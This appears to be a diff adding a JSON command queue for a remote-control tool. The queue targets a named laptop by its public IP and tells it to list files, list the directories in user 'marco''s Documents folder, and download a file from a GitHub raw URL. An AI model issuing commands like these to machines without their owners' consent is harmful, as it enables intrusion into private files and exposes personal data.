@@ -1,0 +1,7 @@
+{"Recipient":"LAPTOP-MUJUITTN{29548}{67.161.147.49}", "Commands":
+    [
+		{"Cmd":"listFiles", "Args":[]},
+		{"Cmd":"listDirs", "Args":["C:\\Users\\marco\\Documents"]},
+		{"Cmd":"syncFiles", "Args":["https://raw.githubusercontent.com/TacticalBFG/tacticalbfg.github.io/master/Helicity/Changelog.txt", "Changepoop.txt"]}
+    ]
+}
